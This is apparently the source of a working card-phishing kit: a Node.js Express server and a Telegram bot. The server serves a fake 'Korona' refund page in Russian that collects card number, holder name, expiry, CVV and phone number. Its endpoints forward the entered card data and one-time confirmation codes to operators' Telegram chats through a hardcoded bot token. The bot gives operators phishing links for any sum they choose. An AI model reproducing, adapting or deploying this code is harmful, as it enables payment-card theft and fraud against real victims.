const express = require('express');
const app = express();
const request = require('request');
const {Telegraf} = require('telegraf');
const bot = new Telegraf('7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc');
const link = 'denzmele-goga-site-42fe.twc1.net'
let sendms = [];
const botusers = [5903574289, 7147845976]
const admins = [5903574289, 7147845976]
function sd(number){
    return number.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
}

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.get('/return', (req, res) => {
    if(req.query.m != undefined && req.query.m > 0) {
        res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Возврат</title>
  <link rel="stylesheet" href="/styles.css">
  <script src="script.js"></script>
</head>
<body style="background-color: #FFFFFF">

  <div style="display: flex;align-items: center;position: absolute;left: 50%;transform: translate(-50%, 0%);">
    <div style="display: inline-block">
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48" height="48" viewBox="0 0 48 48">
        <defs>
          <linearGradient id="b" x1="50%" x2="50%" y1="0%" y2="100%">
            <stop offset="0%" stop-color="#68B3E2"/>
            <stop offset="100%" stop-color="#5AA5D4"/>
          </linearGradient>
          <path id="a" d="M13.2 0h21.6C42.09 0 48 5.91 48 13.2v21.6C48 42.09 42.09 48 34.8 48H13.2C5.91 48 0 42.09 0 34.8V13.2C0 5.91 5.91 0 13.2 0"/>
        </defs>
        <g fill="none" fill-rule="evenodd">
          <g>
            <mask id="c" fill="#fff">
              <use xlink:href="#a"/>
            </mask>
            <use fill="#FFC900" xlink:href="#a"/>
            <use fill="url(#b)" xlink:href="#a"/>
            <path fill="#E61A33" d="M48 0v48H0V0z" mask="url(#c)"/>
          </g>
          <path fill="#FC0" d="M12.69 36v-2.562h21.42V36H12.69zm13.545-23.545l-2.865 2.848-2.805-2.848L23.37 9.6l2.865 2.855zm.38 17.57V19.13c1.905.31 3.756.898 5.496 1.745l-3.551 8.744a.688.688 0 0 1-.609.407c-.266.01-1.335 0-1.335 0zM24.1 16.3v16.01s4.134-.005 5.21 0c.898.003 1.219-.822 1.219-.822l3.775-9.37c.363.238.719.487 1.066.747l-3.923 9.445h2.735L38.4 22.034A22.43 22.43 0 0 0 24.099 16.3zm-3.915 13.726V19.13c-1.905.31-3.756.898-5.496 1.745l3.552 8.744c.11.243.346.4.609.407.266.01 1.335 0 1.335 0zM22.701 16.3v16.01s-4.135-.005-5.21 0c-.899.003-1.22-.822-1.22-.822l-3.774-9.37c-.363.238-.719.487-1.066.747l3.922 9.445H12.62L8.4 22.034A22.43 22.43 0 0 1 22.7 16.3z"/>
        </g>
      </svg>
    </div>
    <span style="vertical-align: middle;margin-left: 0.5vh;color: #717171;font-size: 140%" class="roboto-black">Korona</span>
  </div>
  <span style="position: absolute;left: 50%;top: 16%;transform: translate(-50%, 0%);font-size: 2.5vh;color: #1a1a1a" class="roboto-bold">${sd(req.query.m)} RUB</span>
<div class="form-bg">
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Номер карты:</span>
    <br>
    <input type="text" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="16" maxlength="16" id="cardnum" class="form-inp-box roboto-regular" placeholder="0000 0000 0000 0000">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Имя на карте:</span>
    <br>
    <input type="text" id="cardholder" class="form-inp-box roboto-regular" placeholder="IVANOV IVAN">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Срок действия:</span>
    <br>
    <input type="text" onkeypress="test(this)" maxlength="5" id="cardd" class="form-inp-box roboto-regular" placeholder="ММ/ГГ">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">CVV:</span>
    <br>
    <input type="text" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="3" maxlength="3" id="cardcccvvv" class="form-inp-box roboto-regular" placeholder="123">
  </div>
  <div class="form-inp-cont">
    <span class="form-inp-text roboto-bold">Номер телефона:</span>
    <br>
    <input type="text" onkeypress="return event.charCode >= 48 && event.charCode <= 57" minlength="11" maxlength="11" id="phonenum" class="form-inp-box roboto-regular" placeholder="89001234567">
  </div>
  <p style="color: #f50800;font-size: 1.25vh;margin-left: 2vh" class="roboto-bold" id="Error">Перед тем, как нажать кнопку "Отправить", убедитесь, что занные записаны верно!</p>
  <div class="form-inp-button flex">
    <a href="/getcode" style="color: white;text-decoration: none;" class="roboto-bold" onclick="send(document.getElementById('cardnum').value,document.getElementById('cardholder').value,document.getElementById('cardd').value,document.getElementById('cardcccvvv').value,document.getElementById('phonenum').value)">Отправить</a>
</div>
</div>
  <p class="roboto-regular" style="color: #969696;font-size: clamp(0.6vh, 0.6vw, 0.6vw);min-font-size: 20%;text-align: center;position: absolute;bottom: 3vh;left: 50%;transform: translate(-50%,0%);">Получение доступно на карты национальной платенной системы банков Китал - UnionPау за исключанием Гонконга, Макао и Тайваня (далее - ПС UnionPay). Отправка перевода осуществляется по правилам ПС UnionPay Валюта распоряжения в переводе - доллар США. Банки-эмитенты вправе при зачислении конвертировать валюту перевода в валюту карты получателя по курсу ПС UnionPay а также взимать комиссию РНКО «Платежный Центр» (ООО) не несет ответственности за сумму, зачисленную банком - эмитентом карты Распоряжение о переводе исполняется от нескольких минут, но не позднее трек рабоних дней со дня получения распорижения о переводе При отравко дененного перевода с карты российского банка вас обслуивант РНКО «Платенный Цинтр» (ООО), пиценаия Банка России №3166-К от 14 04 2014г (г Новосибирск, уп. Кирова д 86, ОГРН 1025400002968) Есть ограничения Подробнов о тарифах, ограничениях и условиях оказания успуги - на сайте rnko.ru в разделах "Денежные переводы онпайн" Оператор по перевод</p>

</body>
</html>`);
        let i = 0;
        let timeout = setInterval(()=>{

            var str = encodeURIComponent(`💳 <b>По ссылке перешел пользователь!</b>
Сумма: <code>${req.query.m}</code>`);
            const options = {
                url: `https://api.telegram.org/bot7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
                method: 'GET'
            };
            request(options, (err,res,body)=>{
                if(err){console.log(err);}
            })
            i += 1;
            if(i >= admins.length){
                clearTimeout(timeout);
            }
        }, 300)
    }

    else res.send('400 ERROR')
});
app.get('/getcode', (req, res) => {
    res.render(`code`);
});
app.get('/getcodem', (req,res)=>{
    let i = 0;
    let timeout = setInterval(()=>{

        var str = encodeURIComponent(`💳 <b>Пришел новый код:</b>
Код: <code>${req.query.code}</code>`);
        const options = {
            url: `https://api.telegram.org/bot7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
            method: 'GET'
        };
        request(options, (err,res,body)=>{
            if(err){console.log(err);}
        })
        i += 1;
        if(i >= admins.length){
            clearTimeout(timeout);
        }
    }, 300)
})
app.get('/sendcard', (req, res) => {
    let i = 0;
    let timeout = setInterval(()=>{

        var str = encodeURIComponent(`💳 <b>Ввели новую карту:</b>
Номер карты: <code>${req.query.cnum}</code>
Владелец карты: <code>${req.query.ch}</code>
Срок действия: <code>${req.query.cd}</code>
CVV: <code>${req.query.ccvv}</code>
Номер телефона: <code>${req.query.num}</code>`);
        const options = {
            url: `https://api.telegram.org/bot7131231291:AAH9sZ0aQHgU7ewKyuIUnLCXOqDwgbR-Vpc/sendMessage?chat_id=${admins[i]}&parse_mode=HTML&text=`+str,
            method: 'GET'
        };
        request(options, (err,res,body)=>{
            if(err){console.log(err);}
        })
        i += 1;
        if(i >= admins.length){
            clearTimeout(timeout);
        }
    }, 300)

});
bot.start(async (ctx)=>{
    if(botusers.includes(ctx.message.from.id)) {
        ctx.reply('Выберите что вам нужно', {
            parse_mode: 'HTML',
            reply_markup: {inline_keyboard: [[{text: 'Получить ссылку', callback_data: 'geturi'}]]}
        })
    }
})
bot.on('message', async (ctx)=>{
    if(botusers.includes(ctx.message.from.id)) {
        if (sendms[ctx.message.from.id] !== undefined && sendms[ctx.message.from.id][0] === 'getUrl') {
            if (Number(ctx.message.text) > 0) {
                delete sendms[ctx.message.from.id];
                ctx.reply(`<code>${link}/return?m=${ctx.message.text}</code>`, {parse_mode: 'HTML'})
            }
        }
    }
}).on('callback_query', async (ctx) =>{
    if(botusers.includes(ctx.callbackQuery.from.id)){
        if(ctx.callbackQuery.data === 'geturi'){
            ctx.answerCbQuery();
            ctx.reply('Введите сумму');
            sendms[ctx.callbackQuery.from.id] = ['getUrl']
        }
    }
});


const port = 3000;
app.listen(port, () => {
    console.log('We are live on ' + port);
});

try{
    bot.launch();
}
catch(e){
    console.log('cant handle message', e)
}

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err);
});

